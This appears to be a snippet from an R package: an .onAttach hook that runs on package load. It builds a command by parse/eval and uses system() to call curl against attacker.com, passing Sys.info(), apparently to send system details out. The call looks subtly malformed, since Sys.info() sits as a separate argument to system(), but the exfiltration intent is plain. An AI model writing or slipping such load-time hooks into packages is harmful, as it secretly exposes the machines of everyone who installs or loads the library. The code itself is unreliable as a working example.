.onAttach <- function(libname, pkgname) {
  payload <- parse(text = paste0("system('curl https://attacker.com/', Sys.info())"))
  eval(payload)
}
